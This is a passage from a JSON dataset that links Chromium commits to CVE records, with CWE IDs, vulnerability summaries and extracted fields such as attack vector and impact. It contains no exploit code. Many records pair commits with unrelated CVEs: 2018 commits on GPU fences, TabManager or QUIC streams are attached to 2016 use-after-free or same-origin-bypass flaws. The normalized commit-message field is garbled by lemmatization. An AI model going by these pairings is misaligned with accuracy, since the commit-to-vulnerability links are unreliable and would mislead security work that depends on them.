attacker"},{"commit_id":"925dad6467cd7a2b79322378eafa43d06371b081","cve_id":"CVE-2016-1630","cwe_id":"CWE-264","commit_message":"Fix content_shell with network service enabled not loading pages.\n\nThis regressed in my earlier cl r528763.\n\nThis is a reland of r547221.\n\nBug: 833612\n\nChange-Id: I4c2649414d42773f2530e1abe5912a04fcd0ed9b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1064702\nReviewed-by: Jay Civelli <jcivelli@chromium.org>\nCommit-Queue: John Abd-El-Malek <jam@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#560011}","summary":"The ContainerNode::parserRemoveChild function in WebKit\/Source\/core\/dom\/ContainerNode.cpp in Blink, as used in Google Chrome before 49.0.2623.75, mishandles widget updates, which makes it easier for remote attackers to bypass the Same Origin Policy via a crafted web site.","commit_message_1":"fix content_shell with network service enabled not loading page","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted web site","Impact":"bypass the same origin policy","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"dd77c2a41c72589d929db0592565125ca629fb2c","cve_id":"CVE-2016-1631","cwe_id":"CWE-264","commit_message":"Fix PPB_Flash_MessageLoop.\n\nThis CL suspends script callbacks and resource loads while running nested message loop using PPB_Flash_MessageLoop.\n\nBUG=569496\n\nReview URL: https:\/\/codereview.chromium.org\/1559113002\n\nCr-Commit-Position: refs\/heads\/master@{#374529}","summary":"The PPB_Flash_MessageLoop_Impl::InternalRun function in content\/renderer\/pepper\/ppb_flash_message_loop_impl.cc in the Pepper plugin in Google Chrome before 49.0.2623.75 mishandles nested message loops, which allows remote attackers to bypass the Same Origin Policy via a crafted web site.","commit_message_1":"fix ppb_flash_messageloop","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted web site","Impact":"bypass the same origin policy","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"3f38b2253b19f9f9595f79fb92bfb5077e7b1959","cve_id":"CVE-2016-1632","cwe_id":"CWE-264","commit_message":"Remove UMA.CreatePersistentHistogram.Result\n\nThis histogram isn't showing anything meaningful and the problems it\ncould show are better observed by looking at the allocators directly.\n\nBug: 831013\nChange-Id: Ibe968597758230192e53a7675e7390e968c9e5b9\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1008047\nCommit-Queue: Brian White <bcwhite@chromium.org>\nReviewed-by: Alexei Svitkine <asvitkine@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#549986}","summary":"The Extensions subsystem in Google Chrome before 49.0.2623.75 does not properly maintain own properties, which allows remote attackers to bypass intended access restrictions via crafted JavaScript code that triggers an incorrect cast, related to extensions\/renderer\/v8_helpers.h and gin\/converter.h.","commit_message_1":"remove <file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via crafted javascript code that triggers an incorrect cast , related to extensions \/ renderer \/ v8 _ helpers . h and gin \/ converter . h","Impact":"bypass intended access restrictions","Root Cause":"does not properly maintain own properties","Attack Type":"remote attacker"},{"commit_id":"eb750a539e4856ba9042abdf39ae9da58fa3ae63","cve_id":"CVE-2016-1633","cwe_id":null,"commit_message":"Fix detached Attr nodes interaction with NodeIterator\n\n- Don't register NodeIterator to document when attaching to Attr node.\n-- NodeIterator is registered to its document to receive updateForNodeRemoval notifications.\n-- However it wouldn't make sense on Attr nodes, as they never have children.\n\nBUG=572537\n\nReview URL: https:\/\/codereview.chromium.org\/1577213003\n\nCr-Commit-Position: refs\/heads\/master@{#369687}","summary":"Use-after-free vulnerability in Blink, as used in Google Chrome before 49.0.2623.75, allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"fix detached attr node interaction with nodeiterator - do n't register nodeiterator to document when attaching to attr node","Vulnerability Type":"use - after - free","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"922160eddcb34ca26c834c2a0b0e65269358f0bf","cve_id":"CVE-2016-1634","cwe_id":null,"commit_message":"gfx: Add GpuFence::Wait() method\n\nProvide a GpuFence::Wait() method to hide the implementation details of\nwaiting for a GpuFence object.\n\nBug: 828393\nChange-Id: I2153ebcb4b8cca6bb43c827fb0a9740f6a6cc221\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1021513\nReviewed-by: David Reveman <reveman@chromium.org>\nReviewed-by: Antoine Labour <piman@chromium.org>\nCommit-Queue: Daniele Castagna <dcastagna@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#559292}","summary":"Use-after-free vulnerability in the StyleResolver::appendCSSStyleSheet function in WebKit\/Source\/core\/css\/resolver\/StyleResolver.cpp in Blink, as used in Google Chrome before 49.0.2623.75, allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted web site that triggers Cascading Style Sheets (CSS) style invalidation during a certain subtree-removal action.","commit_message_1":"add gpufence : :wait ( ) method provide a gpufence : :wait ( ) method to hide the implementation detail of waiting for a gpufence object","Vulnerability Type":"use - after - free","Attack Vector":"via a crafted web site that triggers cascading style sheets ( css ) style invalidation during a certain subtree - removal action","Impact":"cause a denial of service or possibly have unspecified other","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"6a60f01228557982e6508c5919cc21fcfddf110b","cve_id":"CVE-2016-1636","cwe_id":"CWE-264","commit_message":"[fuchsia] Implement browser tests for WebRunner Context service.\n\nTests may interact with the WebRunner FIDL services and the underlying\nbrowser objects for end to end testing of service and browser\nfunctionality.\n\n* Add a browser test launcher main() for WebRunner.\n* Add some simple navigation tests.\n* Wire up GoBack()\/GoForward() FIDL calls.\n* Add embedded test server resources and initialization logic.\n* Add missing deletion & notification calls to BrowserContext dtor.\n* Use FIDL events for navigation state changes.\n\n* Bug fixes:\n  ** Move BrowserContext and Screen deletion to PostMainMessageLoopRun(),\n     so that they may use the MessageLoop during teardown.\n  ** Fix Frame dtor to allow for null WindowTreeHosts (headless case)\n  ** Fix std::move logic in Frame ctor which lead to no WebContents\n     observer being registered.\n\nBug: 871594\n\nChange-Id: I36bcbd2436d534d366c6be4eeb54b9f9feadd1ac\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1164539\nCommit-Queue: Kevin Marshall <kmarshall@chromium.org>\nReviewed-by: Wez <wez@chromium.org>\nReviewed-by: Fabrice de Gans-Riberi <fdegans@chromium.org>\nReviewed-by: Scott Violet <sky@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#584155}","summary":"The PendingScript::notifyFinished function in WebKit\/Source\/core\/dom\/PendingScript.cpp in Google Chrome before 49.0.2623.75 relies on memory-cache information about integrity-check occurrences instead of integrity-check successes, which allows remote attackers to bypass the Subresource Integrity (aka SRI) protection mechanism by triggering two loads of the same resource.","commit_message_1":"implement browser test for webrunner context service","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by triggering two loads of the same resource","Impact":"bypass the subresource integrity ( aka sri ) protection mechanism","Root Cause":"caused by an error related to SRI Validation","Attack Type":"remote attacker"},{"commit_id":"7f3d85b096f66870a15b37c2f40b219b2e292693","cve_id":"CVE-2015-8126","cwe_id":"CWE-119","commit_message":"third_party\/libpng: update to 1.2.54\n\nTBR=darin@chromium.org\nBUG=560291\n\nReview URL: https:\/\/codereview.chromium.org\/1467263003\n\nCr-Commit-Position: refs\/heads\/master@{#362298}","summary":"Multiple buffer overflows in the (1) png_set_PLTE and (2) png_get_PLTE functions in libpng before 1.0.64, 1.1.x and 1.2.x before 1.2.54, 1.3.x and 1.4.x before 1.4.17, 1.5.x before 1.5.24, and 1.6.x before 1.6.19 allow remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a small bit-depth value in an IHDR (aka image header) chunk in a PNG image.","commit_message_1":"third_party\/libpng : update to <file>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted PNG file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by improper bounds checking by the png_set_PLTE() and png_get_PLTE() functions","Attack Type":"remote attacker"},{"commit_id":"c66b1fc49870c514b1c1e8b53498153176d7ec2b","cve_id":"CVE-2016-1639","cwe_id":null,"commit_message":"cros: Check initial auth type when showing views login.\n\nBug: 859611\nChange-Id: I0298db9bbf4aed6bd40600aef2e1c5794e8cd058\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1123056\nReviewed-by: Xiaoyin Hu <xiaoyinh@chromium.org>\nCommit-Queue: Jacob Dufault <jdufault@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#572224}","summary":"Use-after-free vulnerability in browser\/extensions\/api\/webrtc_audio_private\/webrtc_audio_private_api.cc in the WebRTC Audio Private API implementation in Google Chrome before 49.0.2623.75 allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging incorrect reliance on the resource context pointer.","commit_message_1":"cro : check initial auth type when showing view login","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging incorrect reliance on the resource context pointer","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"0a1c15fecb1240ab909e1431b6127410c3b380e0","cve_id":"CVE-2016-1640","cwe_id":"CWE-17","commit_message":"Make the webstore inline install dialog be tab-modal\n\nAlso clean up a few minor lint errors while I'm in here.\n\nBUG=550047\n\nReview URL: https:\/\/codereview.chromium.org\/1496033003\n\nCr-Commit-Position: refs\/heads\/master@{#363925}","summary":"The Web Store inline-installer implementation in the Extensions UI in Google Chrome before 49.0.2623.75 does not block installations upon deletion of an installation frame, which makes it easier for remote attackers to trick a user into believing that an installation request originated from the user's next navigation target via a crafted web site.","commit_message_1":"make the webstore inline install dialog be tab-modal also clean up a few minor lint error while i 'm in here","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via a crafted web site","Impact":"trick a user into believing that an installation request originated from the user ' s next navigation target","Root Cause":"does not block installations upon deletion of an installation frame","Attack Type":"remote attacker"},{"commit_id":"75ca8ffd7bd7c58ace1144df05e1307d8d707662","cve_id":"CVE-2016-1641","cwe_id":null,"commit_message":"Don't call WebContents::DownloadImage() callback if the WebContents were deleted\n\nBUG=583718\n\nReview URL: https:\/\/codereview.chromium.org\/1685343004\n\nCr-Commit-Position: refs\/heads\/master@{#375700}","summary":"Use-after-free vulnerability in content\/browser\/web_contents\/web_contents_impl.cc in Google Chrome before 49.0.2623.75 allows remote attackers to cause a denial of service or possibly have unspecified other impact by triggering an image download after a certain data structure is deleted, as demonstrated by a favicon.ico download.","commit_message_1":"callback if the webcontents were deleted bug=<number> review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"by triggering an image download after a certain data structure is deleted , as demonstrated by a favicon . ico download","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"94fef6e2a56ef5b3ed0dc0fd94e6ad52267067fb","cve_id":"CVE-2016-1612","cwe_id":"CWE-20","commit_message":"Change ReadWriteLock to Lock+ConditionVariable in TaskService\n\nThere are non-trivial performance implications of using shared\nSRWLocking on Windows as more state has to be checked.\n\nSince there are only two uses of the ReadWriteLock in Chromium after\nover 1 year, the decision is to remove it.\n\nBUG=758721\n\nChange-Id: I84d1987d7b624a89e896eb37184ee50845c39d80\nReviewed-on: https:\/\/chromium-review.googlesource.com\/634423\nCommit-Queue: Robert Liao <robliao@chromium.org>\nReviewed-by: Takashi Toyoshima <toyoshim@chromium.org>\nReviewed-by: Francois Doray <fdoray@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#497632}","summary":"The LoadIC::UpdateCaches function in ic\/ic.cc in Google V8, as used in Google Chrome before 48.0.2564.82, does not ensure receiver compatibility before performing a cast of an unspecified variable, which allows remote attackers to cause a denial of service or possibly have unknown other impact via crafted JavaScript code.","commit_message_1":"change readwritelock to lock+conditionvariable in taskservice there are non-trivial performance implication of using shared srwlocking on window a more state ha to be checked","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted javascript code","Impact":"cause a denial of service or possibly have unknown other impact","Root Cause":"does not ensure receiver compatibility before performing a cast of an unspecified variable","Attack Type":"remote attacker"},{"commit_id":"7394cf6f43d7a86630d3eb1c728fd63c621b5530","cve_id":"CVE-2016-1613","cwe_id":null,"commit_message":"Connect the LocalDB to TabManager.\n\nBug: 773382\nChange-Id: Iec8fe5226ee175105d51f300f30b4865478ac099\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1118611\nCommit-Queue: S\u00e9bastien Marchand <sebmarchand@chromium.org>\nReviewed-by: Fran\u00e7ois Doray <fdoray@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#572871}","summary":"Multiple use-after-free vulnerabilities in the formfiller implementation in PDFium, as used in Google Chrome before 48.0.2564.82, allow remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted PDF document, related to improper tracking of the destruction of (1) IPWL_FocusHandler and (2) IPWL_Provider objects.","commit_message_1":"connect the localdb to tabmanager","Vulnerability Type":"use - after - free","Attack Vector":"via a crafted pdf document , related to improper tracking of the destruction of ( 1 ) ipwl _ focushandler and ( 2 ) ipwl _ provider objects","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within PDFium","Attack Type":"remote attacker"},{"commit_id":"b399a05453d7b3e2dfdec67865fefe6953bcc59e","cve_id":"CVE-2016-1615","cwe_id":"CWE-254","commit_message":"Allocate a FrameSinkId for RenderWidgetHostViewAura in mus+ash\n\nRenderWidgetHostViewChildFrame expects its parent to have a valid\nFrameSinkId. Make sure RenderWidgetHostViewAura has a FrameSinkId even\nif DelegatedFrameHost is not used (in mus+ash).\n\nBUG=706553\nTBR=jam@chromium.org\n\nReview-Url: https:\/\/codereview.chromium.org\/2847253003\nCr-Commit-Position: refs\/heads\/master@{#468179}","summary":"The Omnibox implementation in Google Chrome before 48.0.2564.82 allows remote attackers to spoof a document's origin via unspecified vectors.","commit_message_1":"allocate a framesinkid for renderwidgethostviewaura in mus+ash renderwidgethostviewchildframe expects it parent to have a valid framesinkid","Vulnerability Type":"Security Features","Attack Vector":"via unspecified vectors","Impact":"spoof a document ' s origin","Root Cause":"caused by an origin confusion within Omnibox","Attack Type":"remote attacker"},{"commit_id":"297ae873b471a46929ea39697b121c0b411434ee","cve_id":"CVE-2016-1616","cwe_id":"CWE-254","commit_message":"Custom buttons should only handle accelerators when focused.\n\nBUG=541415\n\nReview URL: https:\/\/codereview.chromium.org\/1437523005\n\nCr-Commit-Position: refs\/heads\/master@{#360130}","summary":"The CustomButton::AcceleratorPressed function in ui\/views\/controls\/button\/custom_button.cc in Google Chrome before 48.0.2564.82 allows remote attackers to spoof URLs via vectors involving an unfocused custom button.","commit_message_1":"custom button should only handle accelerator when focused","Vulnerability Type":"Security Features","Attack Vector":"via vectors involving an unfocused custom button","Impact":"spoof urls","Root Cause":"The CustomButton::AcceleratorPressed function","Attack Type":"remote attacker"},{"commit_id":"568075bbc5d16239a5cbdeb579a8768f9836f13e","cve_id":"CVE-2016-1617","cwe_id":"CWE-200","commit_message":"CSP: Source expressions can no longer lock sites into insecurity.\n\nCSP's matching algorithm has been updated to make clever folks like Yan\nslightly less able to gather data on user's behavior based on CSP\nreports[1]. This matches Firefox's existing behavior (they apparently\nchanged this behavior a few months ago, via a happy accident[2]), and\nmitigates the CSP-variant of Sniffly[3].\n\nOn the dashboard at https:\/\/www.chromestatus.com\/feature\/6653486812889088.\n\n[1]: https:\/\/github.com\/w3c\/webappsec-csp\/commit\/0e81d81b64c42ca3c81c048161162b9697ff7b60\n[2]: https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1218524#c2\n[3]: https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1218778#c7\n\nBUG=544765,558232\n\nReview URL: https:\/\/codereview.chromium.org\/1455973003\n\nCr-Commit-Position: refs\/heads\/master@{#360562}","summary":"The CSPSource::schemeMatches function in WebKit\/Source\/core\/frame\/csp\/CSPSource.cpp in the Content Security Policy (CSP) implementation in Blink, as used in Google Chrome before 48.0.2564.82, does not apply http policies to https URLs and does not apply ws policies to wss URLs, which makes it easier for remote attackers to determine whether a specific HSTS web site has been visited by reading a CSP report.","commit_message_1":"source expression can no longer lock site into insecurity","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading a CSP report","Impact":"determine whether a specific hsts","Root Cause":"does not apply http policies to https urls and does not apply ws policies to wss urls ","Attack Type":"remote attacker"},{"commit_id":"b90c7c8c335a2e2a4abdd7bde17a44f92c8b3a54","cve_id":"CVE-2016-1620","cwe_id":null,"commit_message":"Fix GPU process fallback logic.\n\n1. In GpuProcessHost::OnProcessCrashed() record the process crash first.\n   This means the GPU mode fallback will happen before a new GPU process\n   is started.\n2. Don't call FallBackToNextGpuMode() if GPU process initialization\n   fails for an unsandboxed GPU process. The unsandboxed GPU is only\n   used for collect information and it's failure doesn't indicate a need\n   to change GPU modes.\n\nBug: 869419\nChange-Id: I8bd0a03268f0ea8809f3df8458d4e6a92db9391f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1157164\nReviewed-by: Zhenyao Mo <zmo@chromium.org>\nCommit-Queue: kylechar <kylechar@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#579625}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 48.0.2564.82 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"fix gpu process fallback logic","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"c0569cc04741cccf6548c2169fcc1609d958523f","cve_id":"CVE-2016-1696","cwe_id":"CWE-284","commit_message":"[Extensions] Expand bindings access checks\n\nBUG=601149\nBUG=601073\n\nReview URL: https:\/\/codereview.chromium.org\/1866103002\n\nCr-Commit-Position: refs\/heads\/master@{#387710}","summary":"The extensions subsystem in Google Chrome before 51.0.2704.79 does not properly restrict bindings access, which allows remote attackers to bypass the Same Origin Policy via unspecified vectors.","commit_message_1":"expand binding access check bug=<number> bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Improper Access Control","Attack Vector":"via unspecified vectors","Impact":"bypass the same origin policy","Root Cause":"does not properly restrict bindings access","Attack Type":"remote attacker"},{"commit_id":"1948aefa8901dca0ccb993753fca00b15d2a6e25","cve_id":"CVE-2016-1697","cwe_id":"CWE-284","commit_message":"Disable frame navigations during DocumentLoader detach in FrameLoader::startLoad\n\nBUG=613266\n\nReview-Url: https:\/\/codereview.chromium.org\/2006033002\nCr-Commit-Position: refs\/heads\/master@{#396241}","summary":"The FrameLoader::startLoad function in WebKit\/Source\/core\/loader\/FrameLoader.cpp in Blink, as used in Google Chrome before 51.0.2704.79, does not prevent frame navigations during DocumentLoader detach operations, which allows remote attackers to bypass the Same Origin Policy via crafted JavaScript code.","commit_message_1":"disable frame navigation during documentloader detach in frameloader : :startload","Vulnerability Type":"Improper Access Control","Attack Vector":"via crafted javascript code","Impact":"bypass the same origin policy","Root Cause":"does not prevent frame navigations during documentloader detach operations","Attack Type":"remote attacker"},{"commit_id":"350f7d4b2c76950c8e7271284de84a9756b796e1","cve_id":"CVE-2016-1667","cwe_id":"CWE-284","commit_message":"P2PQuicStream write functionality.\n\nThis adds the P2PQuicStream::WriteData function and adds tests. It also\nadds the concept of a write buffered amount, enforcing this at the\nP2PQuicStreamImpl.\n\nBug: 874296\nChange-Id: Id02c8aa8d5368a87bb24a2e50dab5ef94bcae131\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1315534\nCommit-Queue: Seth Hampson <shampson@chromium.org>\nReviewed-by: Henrik Bostr\u00f6m <hbos@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#605766}","summary":"The TreeScope::adoptIfNeeded function in WebKit\/Source\/core\/dom\/TreeScope.cpp in the DOM implementation in Blink, as used in Google Chrome before 50.0.2661.102, does not prevent script execution during node-adoption operations, which allows remote attackers to bypass the Same Origin Policy via a crafted web site.","commit_message_1":"p2pquicstream write functionality","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted web site","Impact":"bypass the same origin policy","Root Cause":"does not prevent script execution during node - adoption operations ,","Attack Type":"remote attacker"},{"commit_id":"0cd7a9f853e3cb7c035b4ab9e07a503552267f9d","cve_id":"CVE-2016-1668","cwe_id":"CWE-284","commit_message":"Use correct creation context during Iterable.forEach iteration\n\nUse |thisValue| instead of |scriptState->context()->Global()|, since this\nis simpler and since Global() actually returns a WindowProxy object that\nmay change and become incorrect to use as creation context depending on\nwhat the callback function does.\n\nBUG=605910\n\nReview URL: https:\/\/codereview.chromium.org\/1918763002\n\nCr-Commit-Position: refs\/heads\/master@{#389785}","summary":"The forEachForBinding function in WebKit\/Source\/bindings\/core\/v8\/Iterable.h in the V8 bindings in Blink, as used in Google Chrome before 50.0.2661.102, uses an improper creation context, which allows remote attackers to bypass the Same Origin Policy via a crafted web site.","commit_message_1":"use correct creation context during <file> iteration use |thisvalue| instead of |scriptstate- > context ( ) - > global ( ) | , since this is simpler and since global ( ) actually return a windowproxy object that may change and become incorrect to use a creation context depending on what the callback function doe","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted web site","Impact":"bypass the same origin policy","Root Cause":"uses an improper creation context","Attack Type":"remote attacker"},{"commit_id":"1af4fada49c4f3890f16daac31d38379a9d782b2","cve_id":"CVE-2016-1670","cwe_id":"CWE-362","commit_message":"Block a compromised renderer from reusing request ids.\n\nBUG=578882\n\nReview URL: https:\/\/codereview.chromium.org\/1608573002\n\nCr-Commit-Position: refs\/heads\/master@{#372547}","summary":"Race condition in the ResourceDispatcherHostImpl::BeginRequest function in content\/browser\/loader\/resource_dispatcher_host_impl.cc in Google Chrome before 50.0.2661.102 allows remote attackers to make arbitrary HTTP requests by leveraging access to a renderer process and reusing a request ID.","commit_message_1":"block a compromised renderer from reusing request id","Vulnerability Type":"Race Condition","Attack Vector":"by leveraging access to a renderer process and reusing a request id","Impact":"make arbitrary http requests","Root Cause":"caused by a race condition","Attack Type":"remote attacker"},{"commit_id":"9cfe470d793da6e09b966d435c8fa2ba1625d5fe","cve_id":"CVE-2016-1671","cwe_id":"CWE-22","commit_message":"[base] Make dynamic container to static span conversion explicit\n\nThis change disallows implicit conversions from dynamic containers to\nstatic spans. This conversion can cause CHECK failures, and thus should\nbe done carefully. Requiring explicit construction makes it more obvious\nwhen this happens. To aid usability, appropriate base::make_span<size_t>\noverloads are added.\n\nBug: 877931\nChange-Id: Id9f526bc57bfd30a52d14df827b0445ca087381d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1189985\nReviewed-by: Ryan Sleevi <rsleevi@chromium.org>\nReviewed-by: Balazs Engedy <engedy@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nCommit-Queue: Jan Wilken D\u00f6rrie <jdoerrie@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#586657}","summary":"Google Chrome before 50.0.2661.102 on Android mishandles \/ (slash) and  (backslash) characters, which allows attackers to conduct directory traversal attacks via a file: URL, related to net\/base\/escape.cc and net\/base\/filename_util.cc.","commit_message_1":"make dynamic container to static span conversion explicit this change disallows implicit conversion from dynamic container to static span","Vulnerability Type":"Path Traversal","Attack Vector":"via a file : url , related to net \/ base \/ escape . cc and net \/ base \/ filename _ util . cc .","Impact":"conduct directory traversal attacks","Root Cause":"using the file scheme on Android","Attack Type":"remote attacker"},{"commit_id":"7c5aa07be11cd63d953fbe66370c5869a52170bf","cve_id":"CVE-2016-1652","cwe_id":"CWE-79","commit_message":"Use install_static::GetAppGuid instead of the hardcoded string in BrandcodeConfigFetcher.\n\nBug: 769756\nChange-Id: Ifdcb0a5145ffad1d563562e2b2ea2390ff074cdc\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1213178\nReviewed-by: Dominic Battr\u00e9 <battre@chromium.org>\nCommit-Queue: Vasilii Sukhanov <vasilii@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#590275}","summary":"Cross-site scripting (XSS) vulnerability in the ModuleSystem::RequireForJsInner function in extensions\/renderer\/module_system.cc in the Extensions subsystem in Google Chrome before 50.0.2661.75 allows remote attackers to inject arbitrary web script or HTML via a crafted web site, aka *Universal XSS (UXSS).*","commit_message_1":"use install_static : :getappguid instead of the hardcoded string in brandcodeconfigfetcher","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted web site , aka * universal xss ( uxss ) ","Impact":"inject arbitrary web script or html","Root Cause":"caused by improper validation of user-supplied input by extension bindings","Attack Type":"remote attacker"},{"commit_id":"8355de453bb4014b74b2db5d7ca38c5664d65d83","cve_id":"CVE-2016-1654","cwe_id":"CWE-20","commit_message":"Use an opaque URL rather than an empty URL for request's site for cookies.\n\nApparently this makes a big difference to the cookie settings backend.\n\nBug: 881715\nChange-Id: Id87fa0c6a858bae6a3f8fff4d6af3f974b00d5e4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1212846\nCommit-Queue: Mike West <mkwst@chromium.org>\nReviewed-by: Camille Lamy <clamy@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#589512}","summary":"The media subsystem in Google Chrome before 50.0.2661.75 does not initialize an unspecified data structure, which allows remote attackers to cause a denial of service (invalid read operation) via unknown vectors.","commit_message_1":"use an opaque url rather than an empty url for request 's site for cooky","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( invalid read operation )","Root Cause":"does not initialize an unspecified data structure","Attack Type":"remote attacker"},{"commit_id":"f5ad97cbf2b2b465dc61d8f93820c7e6cab49e4e","cve_id":"CVE-2016-1657","cwe_id":"CWE-254","commit_message":"Revert \"Update fontconfig to 6cc99d6a\"\n\nThis reverts commit e6db40d91d0bd2afeb39f78f6d22404c3525b63c.\n\nReason for revert:\n\nFindit (https:\/\/goo.gl\/kROfz5) identified CL at revision 567445 as the\nculprit for failures in the build cycles as shown on:\nhttps:\/\/findit-for-me.appspot.com\/waterfall\/culprit?key=ag9zfmZpbmRpdC1mb3ItbWVyRAsSDVdmU3VzcGVjdGVkQ0wiMWNocm9taXVtL2U2ZGI0MGQ5MWQwYmQyYWZlYjM5Zjc4ZjZkMjI0MDRjMzUyNWI2M2MM\n\nSample Failed Build: https:\/\/ci.chromium.org\/buildbot\/chromium.linux\/Linux%20Builder%20%28dbg%29%2832%29\/83483\n\nSample Failed Step: compile\n\nOriginal change's description:\n> Update fontconfig to 6cc99d6a\n> \n> Changelog [1].  This is necessary to pick up [2] for fixing undefined-shift\n> UBSAN errors detected by clusterfuzz, [3] to allow removing a build workaround,\n> [4] to fix a bug and clean up some log spam, [5] to fix CFI builds, and [6] to\n> fix a use-after-free.\n> \n> Fontconfig also now requires libuuid as a dependency, so whitelist it as a\n> dependency since we statically link fontconfig.\n> \n> [1] https:\/\/chromium.googlesource.com\/external\/fontconfig\/+log\/b546940435ebfb0df575bc7a2350d1e913919c34..6cc99d6a82ad67d2f5eac887b28bca13c0dfddde\n> [2] https:\/\/chromium.googlesource.com\/external\/fontconfig\/+\/c60ed9ef66e59584f8b54323018e9e6c69925c7e\n> [3] https:\/\/chromium.googlesource.com\/external\/fontconfig\/+\/b8a225b3c3495942480377b7b3404710c70be914\n> [4] https:\/\/chromium.googlesource.com\/external\/fontconfig\/+\/7ad010e80bdf8e41303e322882ece908f5e04c74\n> [5] https:\/\/chromium.googlesource.com\/external\/fontconfig\/+\/096e8019be595c2224aaabf98da630ee917ee51c\n> [6] https:\/\/chromium.googlesource.com\/external\/fontconfig\/+\/6cc99d6a82ad67d2f5eac887b28bca13c0dfddde\n> \n> BUG=831146,822737,787020,829890,847323\n> TBR=thestig,dnicoara\n> \n> Change-Id: Ic2d1bd19af8ca131c960a30d09246827c115ccec\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/1095538\n> Commit-Queue: Thomas Anderson <thomasanderson@chromium.org>\n> Reviewed-by: Thomas Anderson <thomasanderson@chromium.org>\n> Reviewed-by: Lei Zhang <thestig@chromium.org>\n> Reviewed-by: Daniel Nicoara <dnicoara@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#567445}\n\nNo-Presubmit: true\nNo-Tree-Checks: true\nNo-Try: true\nBUG=831146,822737,787020,829890,847323\n\nChange-Id: I47d475941350efc76370fa5eb5043c80c5063495\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1101759\nCr-Commit-Position: refs\/heads\/master@{#567472}","summary":"The WebContentsImpl::FocusLocationBarByDefault function in content\/browser\/web_contents\/web_contents_impl.cc in Google Chrome before 50.0.2661.75 mishandles focus for certain about:blank pages, which allows remote attackers to spoof the address bar via a crafted URL.","commit_message_1":"revert `` update fontconfig to 6cc99d6a '' this reverts commit e6db40d91d0bd2afeb39f78f6d22404c3525b63c","Vulnerability Type":"Security Features","Attack Vector":"via a crafted url","Impact":"spoof the address bar","Root Cause":"mishandles focus for certain about:blank pages","Attack Type":"remote attacker"},{"commit_id":"5c437bcc7a51edbef45242c5173cf7871fde2866","cve_id":"CVE-2016-1658","cwe_id":"CWE-284","commit_message":"Make extensions use a correct same-origin check.\n\nGURL::GetOrigin does not do the right thing for all types of URLs.\n\nBUG=573317\n\nReview URL: https:\/\/codereview.chromium.org\/1658913002\n\nCr-Commit-Position: refs\/heads\/master@{#373381}","summary":"The Extensions subsystem in Google Chrome before 50.0.2661.75 incorrectly relies on GetOrigin method calls for origin comparisons, which allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted extension.","commit_message_1":"make extension use a correct same-origin check","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted extension","Impact":"bypass the same origin policy and obtain sensitive information","Root Cause":"caused by the leaking of restricted information to malicious extensions","Attack Type":"remote 